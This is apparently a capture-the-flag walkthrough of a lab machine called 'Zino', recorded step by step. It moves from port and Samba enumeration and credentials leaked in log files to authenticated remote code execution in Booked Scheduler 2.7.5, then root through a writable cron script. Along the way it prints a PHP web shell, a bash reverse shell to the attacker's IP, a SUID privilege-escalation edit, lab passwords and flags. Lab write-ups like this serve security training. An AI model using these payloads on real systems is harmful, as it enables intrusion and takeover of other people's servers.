@@ -1,0 +1,166 @@
+																							               Zino Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.64
+export IP=192.168.68.64
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql
+8003/tcp open  mcreport
+
+nmap -Pn -n -sC -sV -p21,22,139,445,3306,8003 $IP --open --stats-every=5s -oN results.txt
+
+21/tcp   open  ftp              vsftpd 3.0.3
+22/tcp   open  ssh             OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+3306/tcp open  mysql?
+|_    Host '192.168.49.68' is not allowed to connect to this MariaDB server
+8003/tcp open  http          Apache httpd 2.4.38
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Index of /
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| -     2019-02-05 21:02  booked/
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+Port 139, 445 - Sambata
+enum4linux -a $IP
+
+        zino            Disk      Logs
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+        
+# Let's connect to the share and download all files from there.
+
+smbclient //$IP/zino -N       
+
+smb: \> dir
+  .                                      D        0         Thu Jul  9 15:11:49 2020
+  ..                                     D        0         Tue Apr 28 09:38:53 2020
+  .bash_history                    H        0         Tue Apr 28 11:35:28 2020
+  error.log                           N      265       Tue Apr 28 10:07:32 2020
+  .bash_logout                     H      220      Tue Apr 28 09:38:53 2020
+  local.txt                            N       33        Mon Apr  3 08:00:42 2023
+  .bashrc                             H     3526      Tue Apr 28 09:38:53 2020
+  .gnupg                             DH        0      Tue Apr 28 10:17:02 2020
+  .profile                             H      807       Tue Apr 28 09:38:53 2020
+  misc.log                           N      424       Tue Apr 28 10:08:15 2020
+  auth.log                           N      368       Tue Apr 28 10:07:54 2020
+  access.log                         N     5464      Tue Apr 28 10:07:09 2020
+  ftp                                   D        0        Tue Apr 28 10:12:56 2020
+  
+get local.txt          # Got the first flag, wtf. Easiest flag of my life.  Flag: 1d5fb2e2250ec67116a912027ffa858a
+                              Download the rest of files to check for more sensitive content.
+
+get auth.log        # Got some credentials.
+Apr 28 08:16:54 zino useradd[1048]: new user: name=peter, UID=1001, GID=1001, home=/home/peter, shell=/bin/bash
+Apr 28 08:17:01 zino passwd[1056]: pam_unix(passwd:chauthtok): password changed for peter
+
+cat error.log           # mod_wsgi/4.6.5
+
+cat misc.log            # Got some more credentials
+Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
+Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
+
+                              
+ Port 8003 - HTTP        
+ 
+# When you access the application on http://192.168.68.64:8003/, you notice the /booked/ directory which, when accessed, redirect you to a login page.  
+   It seems that the application is runnning Booked Scheduler v2.7.5.        
+   
+Check the credentials discovered above, we've managed to find the credentials admin / adminadmin.    
+
+# Can't seems to find a file upload or some shit, only CSV files, so , let's check searchsploit for some public exploits
+
+searchsploit Booked Scheduler
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                            |  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Booked Scheduler 2.7.5 - Remote Command Execution (Metasploit)                                                                                                            | php/webapps/46486.rb
+Booked Scheduler 2.7.5 - Remote Command Execution (RCE) (Authenticated)                                                                                              | php/webapps/50594.py
+Booked Scheduler 2.7.7 - Authenticated Directory Traversal                                                                                                                       | php/webapps/48428.txt
+
+# Since we've got the credentials, let's use 50594.py
+searchsploit -m php/webapps/50594.py
+
+# [+] Usage : 50594.py https://target:port username password.
+#  After trying multiple paths, we found that the correct one of the most basic one haha. 
+
+python 50594.py http://192.168.68.64:8003 admin adminadmin 
+
+# Got shell  
+
+# You can also get shell manually 
+# Once you are logged in, you can navigate in the top right where the settings icon is present and open the drop down menu. You have various options there, but you can select “Look and Feel”.
+Or you can be an asshole and navigate manually to the URL: http://192.168.68.64:8003/booked/Web/admin/manage_theme.php
+
+# Change the favicon.ico by uploading a PHP reverse shell directly. Aparently there are no restrictions. We will use the file shell.php. 
+# Now that you've upload the shell, you just need to open a netcat listener and access the favicon.ico resource at http://192.168.68.64:8003/booked/Web/custom-favicon.php
+
+nc -lvnp 21
+http://192.168.68.64:8003/booked/Web/custom-favicon.php
+
+# Got shell again or you can use a web shell such as <?php system($_GET[‘cmd’]);?> and then use a payload such as /bin/bash -i >& /dev/tcp/192.168.49.68/21 0>&1.
+
+http://192.168.68.64:8003/booked/Web/custom-favicon.php?cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.68%2F21%200%3E%261
+
+# Ok, now that we have a shell in three different ways, let's go for privesc.
+
+Privilege escalation
+
+cd /var/www/html/booked/config
+cat config.php
+
+$conf['settings']['database']['user'] = 'booked_user';      
+$conf['settings']['database']['password'] = 'RoachSmallDudgeon368';
+$conf['settings']['database']['name'] = 'bookedscheduler';
+
+# nothing usefull
+
+cat config.dist.php
+$conf['settings']['database']['user'] = 'booked_user';    
+$conf['settings']['database']['password'] = 'password';
+
+# nothing usefull
+# Tried password reuse for user peter: chauthtok, RoachSmallDudgeon368, password. Nothing works :(
+
+cat /etc/crontab
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/3 *   * * *   root    python /var/www/html/booked/cleanup.py                                       # run's every 3 minutes as root, let's go!
+
+# Let's edit the cleanup.py file and copy the bash binary into the tmp folder giving it SUID permissions.
+
+cat python /var/www/html/booked/cleanup.py  
+#!/usr/bin/env python
+import os
+import sys
+try:
+           os.system('rm -r /var/www/html/booked/uploads/reservation/* ')
+except:
+           print ‘ERROR ...’
+sys.exit(0)
+
+# Replace the contents of the script to set SUID on /bin/bash
+#!/usr/bin/env python
+import os
+import sys
+os.system('chmod u+s /bin/dash')
+
+# Once the script is executed, check the rights on the /bin/dash binary and obtain root shell
+/bin/dash -p
+whoami
+root
+cd /root
+cat proof.txt             # Flag: d2d2904d3953f5c7ef1cd702feb2ab85
